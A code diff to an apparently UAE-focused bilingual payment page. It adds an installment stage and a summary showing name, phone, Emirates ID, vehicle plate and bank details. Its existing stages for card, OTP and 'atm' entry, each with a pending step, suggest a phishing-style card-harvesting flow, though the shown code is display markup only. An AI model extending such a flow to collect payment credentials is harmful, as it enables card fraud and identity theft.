@@ -3,7 +3,20 @@ import { useLocation } from "wouter";
 import { trpc } from "@/lib/trpc";
 import { useLanguage } from "@/contexts/LanguageContext";
 
-type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";
+type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed" | "installment";
+
+type InstallmentData = {
+  fullName: string;
+  phone: string;
+  emiratesId: string;
+  email: string;
+  emirate: string;
+  plateCode: string;
+  plateNumber: string;
+  totalAmount: string;
+  bank: string;
+  duration: string;
+};
 
 type CardSubmitPayload = {
   cardName: string;
@@ -41,6 +54,83 @@ function PaymentGatewayHeader() {
     </div>
   );
 }
+
+function InstallmentSummary({ data, lang }: { data: InstallmentData; lang: string }) {
+  const isRTL = lang === "ar";
+  
+  return (
+    <div style={{ direction: isRTL ? "rtl" : "ltr" }}>
+      <SectionCard title={lang === "ar" ? "ملخص طلب التقسيط" : "Installment Request Summary"}>
+        <div style={{ padding: "16px", backgroundColor: "#f9fafb" }}>
+          <div style={{ marginBottom: "16px" }}>
+            <h4 style={{ fontSize: "14px", fontWeight: 700, color: "#374151", marginBottom: "12px" }}>
+              {lang === "ar" ? "البيانات الشخصية" : "Personal Information"}
+            </h4>
+            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px", fontSize: "13px" }}>
+              <div>
+                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "الاسم:" : "Name:"}</span>
+                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.fullName}</div>
+              </div>
+              <div>
+                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "الهاتف:" : "Phone:"}</span>
+                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.phone}</div>
+              </div>
+              <div>
+                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "الهوية:" : "Emirates ID:"}</span>
+                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.emiratesId}</div>
+              </div>
+              <div>
+                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "البريد:" : "Email:"}</span>
+                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.email}</div>
+              </div>
+            </div>
+          </div>
+
+          <div style={{ marginBottom: "16px" }}>
+            <h4 style={{ fontSize: "14px", fontWeight: 700, color: "#374151", marginBottom: "12px" }}>
+              {lang === "ar" ? "بيانات المركبة" : "Vehicle Information"}
+            </h4>
+            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px", fontSize: "13px" }}>
+              <div>
+                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "الإمارة:" : "Emirate:"}</span>
+                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.emirate}</div>
+              </div>
+              <div>
+                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "رمز اللوحة:" : "Plate Code:"}</span>
+                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.plateCode}</div>
+              </div>
+              <div>
+                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "رقم اللوحة:" : "Plate Number:"}</span>
+                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.plateNumber}</div>
+              </div>
+            </div>
+          </div>
+
+          <div style={{ marginBottom: "16px" }}>
+            <h4 style={{ fontSize: "14px", fontWeight: 700, color: "#374151", marginBottom: "12px" }}>
+              {lang === "ar" ? "بيانات التقسيط" : "Installment Details"}
+            </h4>
+            <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: "12px", fontSize: "13px" }}>
+              <div>
+                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "المبلغ:" : "Amount:"}</span>
+                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.totalAmount} AED</div>
+              </div>
+              <div>
+                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "البنك:" : "Bank:"}</span>
+                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.bank}</div>
+              </div>
+              <div>
+                <span style={{ color: "#6b7280" }}>{lang === "ar" ? "المدة:" : "Duration:"}</span>
+                <div style={{ fontWeight: 600, color: "#1f2937" }}>{data.duration} {lang === "ar" ? "شهر" : "months"}</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </SectionCard>
+    </div>
+  );
+}
+
 
 function SectionCard({ title, children }: { title: string; children: ReactNode }) {
   return (
